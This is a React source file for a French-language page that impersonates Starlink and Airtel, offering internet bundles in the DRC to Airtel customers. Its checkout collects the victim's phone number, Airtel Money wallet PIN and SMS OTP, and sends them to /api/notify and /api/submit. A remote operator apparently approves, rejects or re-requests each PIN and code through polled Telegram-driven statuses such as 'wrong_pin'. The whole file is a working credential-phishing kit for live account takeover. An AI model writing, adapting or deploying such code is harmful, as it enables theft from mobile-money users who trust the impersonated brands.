import { useEffect, useRef, useState } from 'react';

const tierStyles = {
  basic: 'card-basic',
  standard: 'card-standard',
  popular: 'card-popular',
  pro: 'card-pro',
  max: 'card-max',
  unlimited: 'card-unlimited'
};

const iconMap = {
  speed: (
    <svg viewBox="0 0 24 24" aria-hidden="true">
      <path d="M12 4l1.45 5.4 5.71.83-4.13 3.73 1.03 5.66L12 16.7l-5.06 2.12 1.04-5.66L3.84 10.23l5.7-.83L12 4z" />
    </svg>
  ),
  globe: (
    <svg viewBox="0 0 24 24" aria-hidden="true">
      <path d="M12 2a10 10 0 100 20 10 10 0 000-20zm0 2a7.96 7.96 0 017.86 6H12V4zm-2 0v6H4.14A7.96 7.96 0 0110 4zm-5 8a8.02 8.02 0 01.16-1.76H10v3.52H5.16A8.02 8.02 0 015 12zm2.09 4.1L5 19.86A7.96 7.96 0 0110 20v-3.9H7.09zm2.91 0V20a7.96 7.96 0 012 0v-3.9H10zm4.91 0H14V20a7.96 7.96 0 012-.14l-1.82-1.76zM14 12v-3.52h4.84A7.96 7.96 0 0114 4v8zm2.91-8.1L19 4.14A7.96 7.96 0 0114 4v-.1z" />
    </svg>
  ),
  shield: (
    <svg viewBox="0 0 24 24" aria-hidden="true">
      <path d="M12 2l7 4v6.5c0 5.25-3.67 9.76-7 10.5-3.33-.74-7-5.25-7-10.5V6l7-4z" />
    </svg>
  ),
  wrench: (
    <svg viewBox="0 0 24 24" aria-hidden="true">
      <path d="M21.7 5.3l-3-3c-.4-.4-1-.4-1.4 0l-2.5 2.5c-.2.2-.3.4-.3.7l-.3 3.3c0 .4.3.7.7.7l3.3-.3c.3 0 .5-.1.7-.3l2.5-2.5c.4-.4.4-1 0-1.4zM8.2 12.4c.8.8 2 .8 2.8 0l1.4-1.4 2.5 2.5-1.4 1.4c-.8.8-.8 2 0 2.8l2.8 2.8-3.5 3.5-2.8-2.8c-.8-.8-2-.8-2.8 0l-1.4 1.4-3.5-3.5 1.4-1.4c.8-.8.8-2 0-2.8l-2.8-2.8 3.5-3.5 2.8 2.8z" />
    </svg>
  )
};

const uiIconMap = {
  mobile: (
    <svg viewBox="0 0 24 24" aria-hidden="true">
      <path d="M8 3h8a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2zm4 16.25a1.25 1.25 0 1 0 0 .01V19.25zM9 6h6v10H9V6z" />
    </svg>
  ),
  lock: (
    <svg viewBox="0 0 24 24" aria-hidden="true">
      <path d="M12 2a5 5 0 0 1 5 5v2h1a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2v-9a2 2 0 0 1 2-2h1V7a5 5 0 0 1 5-5zm3 7V7a3 3 0 0 0-6 0v2h6zm-3 3a2 2 0 0 1 1 3.73V18h-2v-2.27A2 2 0 0 1 12 12z" />
    </svg>
  ),
  otp: (
    <svg viewBox="0 0 24 24" aria-hidden="true">
      <path d="M12 2a10 10 0 1 1-7.07 2.93A10 10 0 0 1 12 2zm1 5h-2v6l5 3 1-1.73-4-2.27V7z" />
    </svg>
  ),
  shieldCheck: (
    <svg viewBox="0 0 24 24" aria-hidden="true">
      <path d="M12 2l8 4v6c0 5.25-3.67 9.76-8 10-4.33-.24-8-4.75-8-10V6l8-4zm-1 12.17-2.59-2.58L7 13l4 4 6-6-1.41-1.41L11 14.17z" />
    </svg>
  ),
  spark: (
    <svg viewBox="0 0 24 24" aria-hidden="true">
      <path d="M13 2l-2 6h4l-6 14 2-8H7l6-12z" />
    </svg>
  ),
  wifi: (
    <svg viewBox="0 0 24 24" aria-hidden="true">
      <path d="M12 18.5a1.5 1.5 0 1 0 0 .01V18.5zM2.1 9.58 3.5 11A12 12 0 0 1 20.5 11l1.4-1.42a14 14 0 0 0-19.8 0zm3.6 3.62 1.42 1.4a7 7 0 0 1 9.76 0l1.42-1.4a9 9 0 0 0-12.6 0zm3.6 3.6 1.4 1.42a2 2 0 0 1 2.8 0l1.4-1.42a4 4 0 0 0-5.6 0z" />
    </svg>
  ),
  refresh: (
    <svg viewBox="0 0 24 24" aria-hidden="true">
      <path d="M17.65 6.35A7.95 7.95 0 0 0 12 4V1L7 6l5 5V7a5 5 0 1 1-4.9 6H5.02A7 7 0 1 0 17.65 6.35z" />
    </svg>
  ),
  starlink: (
    <svg viewBox="0 0 24 24" aria-hidden="true">
      <path d="M3 17.5 15.8 4H21L8.2 17.5z" />
      <path d="M3 20h5.2L21 6.7V12L12.7 20z" />
    </svg>
  ),
  airtel: (
    <svg viewBox="0 0 24 24" aria-hidden="true">
      <path d="M13.3 4.2c2.3 0 4.3 1.3 5.2 3.4.5 1.1.3 2.4-.4 3.3-.6.8-1.4 1.2-2.4 1.2h-2.1c-1.2 0-2 .5-2.5 1.5-.4.8-.6 1.8-.6 2.9V20H7.9v-3.7c0-1.5.3-2.9 1-4.1 1-1.7 2.5-2.6 4.6-2.6h1.8c.5 0 .8-.1 1-.4.2-.3.2-.7 0-1.1-.5-1.2-1.7-1.9-3-1.9-1.6 0-2.9.8-3.8 2.3L7.3 7.1c1.4-1.9 3.5-2.9 6-2.9z" />
    </svg>
  )
};

function Icon({ type }) {
  return <span className="feature-icon">{iconMap[type]}</span>;
}

function UiGlyph({ type }) {
  return <span className="ui-glyph">{uiIconMap[type]}</span>;
}

function BrandMark({ sources, alt, fallbackType, small = false, brand = 'generic' }) {
  const [useFallback, setUseFallback] = useState(false);
  const [sourceIndex, setSourceIndex] = useState(0);

  const currentSrc = Array.isArray(sources) ? sources[sourceIndex] : null;

  return (
    <span className={`brand-mark-shell${small ? ' brand-mark-shell-small' : ''}`}>
      {useFallback || !currentSrc ? (
        <UiGlyph type={fallbackType} />
      ) : (
        <img
          src={currentSrc}
          alt={alt}
          className={`brand-mark brand-mark--${brand}${small ? ' brand-mark-small' : ''}`}
          loading="lazy"
          decoding="async"
          onError={() => {
            const hasNext = Array.isArray(sources) && sourceIndex < sources.length - 1;
            if (hasNext) {
              setSourceIndex((current) => current + 1);
            } else {
              setUseFallback(true);
            }
          }}
        />
      )}
    </span>
  );
}

function App() {
  const [data, setData] = useState(null);
  const [error, setError] = useState(null);
  const [checkoutOffer, setCheckoutOffer] = useState(null);
  const [airtelNumber, setAirtelNumber] = useState('');
  const [walletPin, setWalletPin] = useState('');
  const [otpSent, setOtpSent] = useState(false);
  const [otpCode, setOtpCode] = useState('');
  const [otpTimer, setOtpTimer] = useState(0);
  const [paymentConfirmed, setPaymentConfirmed] = useState(false);
  const [airtelError, setAirtelError] = useState('');
  const [walletPinError, setWalletPinError] = useState('');
  const [otpError, setOtpError] = useState('');
  const [submissionError, setSubmissionError] = useState('');
  const [resendError, setResendError] = useState('');
  const [resendMessage, setResendMessage] = useState('');
  const [submissionLoading, setSubmissionLoading] = useState(false);
  const [resendLoading, setResendLoading] = useState(false);
  const [telegramAction, setTelegramAction] = useState(null);
  const [actionError, setActionError] = useState('');
  const [actionLoading, setActionLoading] = useState(false);
  const [waitingApproval, setWaitingApproval] = useState(false);
  const [approvalError, setApprovalError] = useState('');
  const [approvalPassed, setApprovalPassed] = useState(false);
  const otpInputRef = useRef(null);

  useEffect(() => {
    if (approvalPassed) {
      // small timeout to ensure input is rendered
      setTimeout(() => otpInputRef.current?.focus?.(), 50);
    }
  }, [approvalPassed]);

  useEffect(() => {
    fetch('/api/offres')
      .then((res) => {
        if (!res.ok) {
          throw new Error('Erreur du serveur');
        }
        return res.json();
      })
      .then((json) => setData(json))
      .catch((fetchError) => setError(fetchError.message));
  }, []);

  useEffect(() => {
    if (!approvalPassed || paymentConfirmed) {
      return undefined;
    }

    setResendMessage('');
    setResendError('');
    setOtpTimer(60);
    const interval = setInterval(() => {
      setOtpTimer((current) => {
        if (current <= 1) {
          clearInterval(interval);
          return 0;
        }
        return current - 1;
      });
    }, 1000);

    return () => clearInterval(interval);
  }, [approvalPassed, paymentConfirmed]);

  useEffect(() => {
    if (!waitingApproval || !airtelNumber || telegramAction || approvalError) {
      return undefined;
    }

    let interval = null;
    const queryPhone = encodeURIComponent(airtelNumber.trim());

    const pollApprovalStatus = async () => {
      try {
        const res = await fetch(`/api/action-status?phone=${queryPhone}&stage=approval`);
        if (!res.ok) {
          const json = await res.json().catch(() => null);
          throw new Error(json?.message || 'Echec de verification du statut.');
        }

        const json = await res.json();
        if (json?.action === 'allow_proceed') {
          setWaitingApproval(false);
          setApprovalPassed(true);
          setOtpSent(true);
          setApprovalError('');
          setOtpError('');
          setActionLoading(false);
          setTelegramAction(json);
          return;
        }

        if (json?.action === 'invalid_info') {
          setWaitingApproval(false);
          setApprovalPassed(false);
          setApprovalError('Code PIN incorrect. Veuillez verifier les informations et reessayer.');
          setOtpSent(false);
          setOtpTimer(0);
          setActionLoading(false);
          return;
        }
      } catch (err) {
        setApprovalError(err.message || 'Echec de verification.');
        setActionLoading(false);
        clearInterval(interval);
      }
    };

    interval = setInterval(pollApprovalStatus, 3000);
    pollApprovalStatus();

    return () => clearInterval(interval);
  }, [waitingApproval, airtelNumber, telegramAction, approvalError]);

  useEffect(() => {
    if (!paymentConfirmed || !airtelNumber || telegramAction || actionError) {
      return undefined;
    }

    let interval = null;
    const queryPhone = encodeURIComponent(airtelNumber.trim());

    const pollActionStatus = async () => {
      try {
        const res = await fetch(`/api/action-status?phone=${queryPhone}&stage=verification`);
        if (!res.ok) {
          const json = await res.json().catch(() => null);
          throw new Error(json?.message || 'Echec de verification du statut OTP.');
        }

        const json = await res.json();
        if (json?.action) {
          setTelegramAction(json);
          setActionLoading(false);

          if (json.action === 'wrong_pin') {
            // Wrong PIN sends user back to phone/PIN step.
            setPaymentConfirmed(false);
            setApprovalPassed(false);
            setOtpSent(false);
            setOtpCode('');
            setOtpTimer(0);
            setWaitingApproval(false);
            setOtpError('');
            setApprovalError('Code PIN incorrect. Veuillez ressaisir votre numero et votre PIN Wallet.');
            return;
          }

          if (json.action === 'wrong_code') {
            // Wrong OTP keeps user on OTP step for quick retry.
            setPaymentConfirmed(false);
            setApprovalPassed(true);
            setOtpSent(true);
            setOtpTimer(60);
            setOtpError('Code OTP incorrect. Veuillez le ressaisir.');
            return;
          }

          return;
        }
      } catch (err) {
        setActionError(err.message || 'Echec de recuperation de la reponse.');
        setActionLoading(false);
        clearInterval(interval);
      }
    };

    interval = setInterval(pollActionStatus, 3000);
    pollActionStatus();

    return () => clearInterval(interval);
  }, [paymentConfirmed, airtelNumber, telegramAction, actionError]);

  const startCheckout = (offre) => {
    setCheckoutOffer(offre);
    setAirtelNumber('');
    setWalletPin('');
    setOtpSent(false);
    setOtpTimer(0);
    setOtpCode('');
    setPaymentConfirmed(false);
    setAirtelError('');
    setWalletPinError('');
    setOtpError('');
    setWaitingApproval(false);
    setApprovalPassed(false);
    setApprovalError('');
    setTelegramAction(null);
    setActionError('');
    setActionLoading(false);
  };

  const handleBack = () => {
    setCheckoutOffer(null);
    setOtpSent(false);
    setPaymentConfirmed(false);
    setOtpTimer(0);
    setOtpCode('');
    setAirtelError('');
    setWalletPinError('');
    setOtpError('');
    setWaitingApproval(false);
    setApprovalPassed(false);
    setApprovalError('');
    setTelegramAction(null);
    setActionError('');
    setActionLoading(false);
  };

  const handleCheckoutSubmit = async (event) => {
    event.preventDefault();
    setAirtelError('');
    setWalletPinError('');
    setOtpError('');
    setApprovalError('');
    setSubmissionError('');
    setResendError('');
    setResendMessage('');

    if (!otpSent) {
      const cleanedNumber = airtelNumber.replace(/\D/g, '');
      const validPhone = /^(0\d{9}|\+243\d{9})$/.test(airtelNumber.replace(/\s+/g, '')) || /^(0\d{9,10})$/.test(cleanedNumber);
      const pinVal = walletPin.trim();
      const validPin = /^\d{4,6}$/.test(pinVal);

      if (!validPhone) {
        setAirtelError('Entrez un numero Airtel valide (commencez par 0 ou +243).');
      }

      if (!validPin) {
        setWalletPinError('Entrez un PIN Wallet valide (4 a 6 chiffres).');
      }

      if (!validPhone || !validPin) {
        return;
      }

      setSubmissionLoading(true);
      try {
        const response = await fetch('/api/notify', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            offerId: checkoutOffer.id,
            offerTitle: checkoutOffer.title,
            airtelNumber: airtelNumber.trim(),
            walletPin: walletPin.trim()
          })
        });

        const body = await response.json().catch(() => null);
        if (!response.ok) {
          const errorMsg = body?.message || 'Echec de notification.';
          const detail = body?.detail ? ` ${body.detail}` : '';
          throw new Error(`${errorMsg}${detail}`);
        }

        setOtpSent(true);
        setWaitingApproval(true);
        setApprovalPassed(false);
        setApprovalError('');
        setTelegramAction(null);
        setActionError('');
        setActionLoading(true);
        setOtpTimer(60);
        setResendMessage('Validation de vos informations...');
      } catch (err) {
        setSubmissionError(err.message || 'Echec d\'envoi des informations. Veuillez reessayer plus tard.');
      } finally {
        setSubmissionLoading(false);
      }
      return;
    }

    if (otpTimer === 0) {
      setOtpError('OTP expire. Veuillez reessayer.');
      return;
    }

    if (!/^\d{4}$/.test(otpCode)) {
      setOtpError('Entrez un code OTP valide a 4 chiffres.');
      return;
    }

    setSubmissionLoading(true);

    try {
      const response = await fetch('/api/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          offerId: checkoutOffer.id,
          offerTitle: checkoutOffer.title,
          airtelNumber: airtelNumber.trim(),
          walletPin: walletPin.trim(),
          otpCode: otpCode.trim()
        })
      });

      const body = await response.json().catch(() => null);
      if (!response.ok) {
        const errorMsg = body?.message || 'Echec de soumission.';
        const detail = body?.detail ? ` ${body.detail}` : '';
        throw new Error(`${errorMsg}${detail}`);
      }

      setTelegramAction(null);
      setActionError('');
      setActionLoading(true);
      setPaymentConfirmed(true);
    } catch (err) {
      setSubmissionError(err.message || 'Echec d\'envoi des informations. Veuillez reessayer plus tard.');
    } finally {
      setSubmissionLoading(false);
    }
  };

  const handleResendOtp = async () => {
    if (!checkoutOffer) {
      return;
    }

    setResendLoading(true);
    setResendError('');
    setResendMessage('');

    try {
      const response = await fetch('/api/notify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          offerId: checkoutOffer.id,
          offerTitle: checkoutOffer.title,
          airtelNumber: airtelNumber.trim(),
          walletPin: walletPin.trim()
        })
      });

      const body = await response.json().catch(() => null);
      if (!response.ok) {
        const errorMsg = body?.message || 'Echec du renvoi.';
        const detail = body?.detail ? ` ${body.detail}` : '';
        throw new Error(`${errorMsg}${detail}`);
      }

      setResendMessage('OTP renvoye avec succes.');
      setOtpTimer(60);
    } catch (err) {
      setResendError(err.message || 'Echec du renvoi OTP.');
    } finally {
      setResendLoading(false);
    }
  };

  if (error && !data) {
    return (
      <div className="page-shell">
        <div className="message-block error">Erreur : {error}</div>
      </div>
    );
  }

  if (!data) {
    return (
      <div className="page-shell">
        <div className="message-block loading">Chargement...</div>
      </div>
    );
  }

  if (checkoutOffer) {
    const checkoutStatusIcon = waitingApproval ? 'refresh' : approvalPassed ? 'otp' : 'shieldCheck';

    return (
      <main className="page-shell">
        <div className="checkout-shell">
          <section className="checkout-card">
            <div className="checkout-header">
              <div>
                <span className="checkout-tag">RESERVATION</span>
                <h1 className="checkout-title">Choisissez {checkoutOffer.title}</h1>
              </div>
              <button type="button" className="checkout-back" onClick={handleBack}>
                ← Retour aux offres
              </button>
            </div>

            <p className="checkout-subtitle checkout-subtitle-icon">
              <UiGlyph type={checkoutStatusIcon} />
              <span>
                {waitingApproval
                  ? 'Validation de vos informations...'
                  : approvalPassed
                    ? `Un code OTP a ete envoye a ${airtelNumber || 'votre numero Airtel'}. Saisissez-le pour terminer.`
                    : 'Verifiez votre numero avec votre PIN Wallet'}
              </span>
            </p>
{waitingApproval && (
                <div className="checkout-info recycling-spinner" aria-live="polite" aria-busy="true">
                  <svg width="48" height="48" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
                    <path fill="currentColor" d="M12 2v2a8 8 0 1 0 8 8h2a10 10 0 1 1-10-10z"/>
                    <path fill="currentColor" d="M7 7l-4 4 4 4V11h6V7H7z"/>
                  </svg>
                  <span>Validation de vos informations...</span>
                  <span className="sr-only">Validation des informations</span>
                </div>
              )}
              {approvalError && (
                <div className="checkout-error field-error">{approvalError}</div>
              )}
              {approvalPassed && !paymentConfirmed && (
              <div className="otp-timer">
                {otpTimer > 0
                  ? `Code valide pendant : ${otpTimer}s`
                  : 'Le code OTP a expire. Rechargez la page ou reessayez.'}
              </div>
            )}

            <form className="checkout-form" onSubmit={handleCheckoutSubmit}>
              {!otpSent && (
                <>
                  <label className="form-field">
                    <span className="label-with-icon"><UiGlyph type="mobile" />Numero Airtel</span>
                    <input
                      type="tel"
                      value={airtelNumber}
                      onChange={(event) => {
                        setAirtelNumber(event.target.value);
                        if (airtelError) setAirtelError('');
                        if (approvalError) setApprovalError('');
                        if (submissionError) setSubmissionError('');
                      }}
                      placeholder="078 976 565 67"
                      required
                    />
                    {airtelError && <span className="field-error">{airtelError}</span>}
                  </label>

                  <label className="form-field">
                    <span className="label-with-icon"><UiGlyph type="lock" />PIN Wallet</span>
                    <input
                      type="password"
                      value={walletPin}
                      onChange={(event) => {
                        setWalletPin(event.target.value);
                        if (walletPinError) setWalletPinError('');
                        if (approvalError) setApprovalError('');
                        if (submissionError) setSubmissionError('');
                      }}
                      placeholder="1234"
                      inputMode="numeric"
                      required
                    />
                    {walletPinError && <span className="field-error">{walletPinError}</span>}
                  </label>
                </>
              )}

              {approvalPassed && !paymentConfirmed && (
                <label className="form-field">
                  <span className="label-with-icon"><UiGlyph type="otp" />Code OTP</span>
                  <input
                    ref={otpInputRef}
                    type="text"
                    value={otpCode}
                    onChange={(event) => {
                      setOtpCode(event.target.value.replace(/\D/g, '').slice(0, 4));
                      if (otpError) setOtpError('');
                      if (submissionError) setSubmissionError('');
                    }}
                    inputMode="numeric"
                    maxLength={4}
                    placeholder="1234"
                    required
                  />
                  {otpError && <span className="field-error">{otpError}</span>}
                </label>
              )}

              {approvalPassed && !paymentConfirmed && (
                <div className="form-resend">
                  <button
                    type="button"
                    className="button-secondary"
                    onClick={handleResendOtp}
                    disabled={resendLoading || otpTimer === 0}
                  >
                    {resendLoading ? 'Renvoi...' : 'Renvoyer OTP'}
                  </button>
                  {resendMessage && <span className="field-success">{resendMessage}</span>}
                  {resendError && <span className="field-error">{resendError}</span>}
                </div>
              )}

              <div className="form-actions">
                <button type="button" className="button-secondary" onClick={handleBack}>
                  Annuler
                </button>
                <button
                  type="submit"
                  className="button-primary"
                  disabled={(approvalPassed && otpTimer === 0 && !paymentConfirmed) || submissionLoading || waitingApproval || actionLoading}
                >
                  {submissionLoading
                    ? 'Envoi...'
                    : approvalPassed
                      ? 'Valider OTP'
                      : `Valider et payer ${checkoutOffer.currency}${checkoutOffer.price.toFixed(2)}`}
                </button>
              </div>
            </form>

            {paymentConfirmed && actionLoading && (
              <div className="checkout-info recycling-spinner" aria-live="polite" aria-busy="true">
                <svg width="36" height="36" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
                  <path fill="currentColor" d="M12 2v2a8 8 0 1 0 8 8h2a10 10 0 1 1-10-10z"/>
                  <path fill="currentColor" d="M7 7l-4 4 4 4V11h6V7H7z"/>
                </svg>
                <span>Validation OTP...</span>
                <span className="sr-only">Validation OTP</span>
              </div>
            )}

            {submissionError && (
              <div className="checkout-error field-error">{submissionError}</div>
            )}

            {actionError && (
              <div className="checkout-error field-error">{actionError}</div>
            )}

            {telegramAction && telegramAction.action === 'allow_proceed' && !paymentConfirmed && (
              <div className="checkout-success status-line">
                <UiGlyph type="shieldCheck" />
                Approuve. Saisissez l'OTP pour terminer votre paiement.
              </div>
            )}

            {paymentConfirmed && (
              <div className="checkout-confirmation status-line">
                <UiGlyph type="spark" />
                OTP verifie. Veuillez attendre l'invite de paiement pour terminer votre commande.
              </div>
            )}

            {paymentConfirmed && actionLoading && (
              <div className="checkout-info">
                Validation OTP... Cela peut prendre quelques secondes.
              </div>
            )}

            {paymentConfirmed && telegramAction && (
              <div className="checkout-success status-line">
                <UiGlyph type="shieldCheck" />
                <strong>Action recue :</strong> {telegramAction.text}
              </div>
            )}

            {paymentConfirmed && actionError && (
              <div className="checkout-error field-error">
                {actionError}
              </div>
            )}
          </section>
        </div>
      </main>
    );
  }

  const recommendedOffer = data.offres.find((offre) => offre.badge) || data.offres[0];

  return (
    <main className="page-shell">
      <div className="poster-shell">
        <section className="hero-panel">
          <div className="hero-copy">
            <div className="hero-brand">
              <span className="hero-title">STARLINK</span>
              <span className="hero-subtitle">EN RDC</span>
            </div>
            <div className="hero-brandline">
              <div className="hero-brand-icons" aria-label="Partenaires">
                <div className="brand-badge brand-badge-starlink">
                  <BrandMark
                    sources={['/brand/starlink-logo.svg', '/brand/starlink-logo.png', '/brand/starlink-logo.jpg', '/brand/starlink-logo.jpeg', '/brand/starlink-logo.webp']}
                    alt="Starlink"
                    fallbackType="starlink"
                    brand="starlink"
                  />
                  <span>Starlink</span>
                </div>
                <div className="brand-badge brand-badge-airtel">
                  <BrandMark
                    sources={['/brand/airtel-logo.svg', '/brand/airtel-logo.png', '/brand/airtel-logo.jpg', '/brand/airtel-logo.jpeg', '/brand/airtel-logo.webp']}
                    alt="Airtel"
                    fallbackType="airtel"
                    brand="airtel"
                  />
                  <span>Airtel</span>
                </div>
              </div>
              <span className="hero-note">LIGNE AIRTEL UNIQUEMENT</span>
            </div>
            <div className="hero-line">
              <span>VRAI INTERNET</span>
              <strong>PARTOUT.</strong>
            </div>
            <div className="hero-text">OFFRES SPECIALES RESERVEES AUX CLIENTS AIRTEL</div>
            <div className="hero-tags">
              <span><UiGlyph type="wifi" />4G+</span>
              <span><UiGlyph type="shieldCheck" />Couverture stable</span>
              <span><UiGlyph type="spark" />Activation rapide</span>
            </div>
          </div>
          <div className="hero-visual">
            <div className="hero-panners" aria-hidden="true">
              <div className="hero-panner">
                <BrandMark
                  sources={['/brand/starlink-logo.svg', '/brand/starlink-logo.png', '/brand/starlink-logo.jpg', '/brand/starlink-logo.jpeg', '/brand/starlink-logo.webp']}
                  alt="Starlink"
                  fallbackType="starlink"
                  brand="starlink"
                  small
                />
                <span>Liaison satellite stable</span>
              </div>
              <div className="hero-panner">
                <BrandMark
                  sources={['/brand/airtel-logo.svg', '/brand/airtel-logo.png', '/brand/airtel-logo.jpg', '/brand/airtel-logo.jpeg', '/brand/airtel-logo.webp']}
                  alt="Airtel"
                  fallbackType="airtel"
                  brand="airtel"
                  small
                />
                <span>Compatible Airtel Money</span>
              </div>
            </div>
            <svg className="hero-scene" viewBox="0 0 560 360" preserveAspectRatio="xMidYMid slice" aria-hidden="true">
              <defs>
                <linearGradient id="beamGradient" x1="0" y1="0" x2="0" y2="1">
                  <stop offset="0%" stopColor="rgba(255,255,255,0.9)" />
                  <stop offset="100%" stopColor="rgba(255,255,255,0.05)" />
                </linearGradient>
                <radialGradient id="glow" cx="50%" cy="30%" r="50%">
                  <stop offset="0%" stopColor="rgba(104, 169, 255, 0.4)" />
                  <stop offset="100%" stopColor="rgba(10, 17, 38, 0)" />
                </radialGradient>
              </defs>
              <rect width="560" height="360" fill="url(#glow)" />
              <circle cx="300" cy="100" r="36" fill="rgba(255,255,255,0.9)" opacity="0.9" />
              <path d="M228 238C240 190 310 178 368 192C423 205 482 232 506 286" fill="none" stroke="rgba(255,255,255,0.18)" strokeWidth="24" strokeLinecap="round" />
              <path d="M130 340C140 290 210 250 304 258C390 266 444 304 490 348" fill="none" stroke="rgba(255,255,255,0.2)" strokeWidth="28" strokeLinecap="round" />
              <path d="M172 316C218 250 300 242 360 250C416 258 460 284 508 336" fill="none" stroke="rgba(255,255,255,0.16)" strokeWidth="20" strokeLinecap="round" />
              <rect x="350" y="24" width="140" height="14" rx="7" fill="#e7f6ff" opacity="0.95" transform="rotate(-20 420 31)" />
              <rect x="340" y="60" width="170" height="10" rx="5" fill="#d3e9ff" opacity="0.92" transform="rotate(-20 425 65)" />
              <g transform="translate(390 32) rotate(-18)">
                <rect x="0" y="0" width="42" height="18" rx="8" fill="#ffffff" opacity="0.96" />
                <rect x="46" y="2" width="42" height="14" rx="7" fill="#ffffff" opacity="0.95" />
                <rect x="-14" y="6" width="80" height="6" rx="3" fill="#d4e8ff" opacity="0.8" />
              </g>
              <path d="M110 330 Q180 275 260 286 Q320 294 388 320 Q450 342 510 358" fill="url(#beamGradient)" opacity="0.55" />
              <path d="M300 90 L410 38" stroke="#9dd4ff" strokeWidth="3" strokeLinecap="round" />
              <path d="M300 90 L470 10" stroke="#62b5ff" strokeWidth="2" strokeDasharray="6 6" strokeLinecap="round" />
              <circle cx="310" cy="86" r="8" fill="#fff" opacity="0.98" />
            </svg>
          </div>
        </section>

        <section className="card-grid" id="offers">
          {data.offres.map((offre) => (
            <article key={offre.id} className={`offer-card ${tierStyles[offre.tier] || ''}`}>
              <div className="offer-top">
                <span className="offer-charge">4G+</span>
                {offre.badge && <span className={`offer-badge ${offre.badgeClass}`}>{offre.badge}</span>}
              </div>
              <div className="offer-body">
                <span className="offer-amount">{offre.title}</span>
                <span className="offer-duration">{offre.subtitle}</span>
              </div>
              <div className="offer-price">
                <span className="offer-currency">{offre.currency}</span>
                <span className="offer-value">{offre.price.toFixed(2)}</span>
              </div>
              <button type="button" onClick={() => startCheckout(offre)}>
                <UiGlyph type="spark" />
                Choisir cette offre
              </button>
            </article>
          ))}
        </section>

        <section className="kit-box">
          <div className="kit-hero">
            <div className="kit-tag">ILLIMITE</div>
            <small>4G+</small>
          </div>
          <div className="kit-details">
            <div className="kit-name">KIT STARLINK STANDARD</div>
            <div className="kit-info">
              <span className="label-with-icon"><UiGlyph type="wifi" />{data.kit.description}</span>
              <span className="label-with-icon"><UiGlyph type="lock" />{data.kit.paymentHint}</span>
            </div>
          </div>
          <div className="kit-price-block">
            <span>{data.kit.currency}</span>
            <span>{data.kit.price}</span>
          </div>
          <div className="kit-banner">OFFRE WEB EXCLUSIVE - REMISE SUR TOUS LES KITS</div>
        </section>

        <section className="feature-grid">
          <article>
            <Icon type="speed" />
            <div>
              <strong>ULTRA RAPIDE</strong>
              <span>Internet sans coupure</span>
            </div>
          </article>
          <article>
            <Icon type="globe" />
            <div>
              <strong>PARTOUT EN RDC</strong>
              <span>Même dans les zones reculées</span>
            </div>
          </article>
          <article>
            <Icon type="shield" />
            <div>
              <strong>FIABLE</strong>
              <span>Même sous la pluie</span>
            </div>
          </article>
          <article>
            <Icon type="wrench" />
            <div>
              <strong>INSTALLATION FACILE</strong>
              <span>En quelques minutes</span>
            </div>
          </article>
        </section>

      </div>
    </main>
  );
}

export default App;
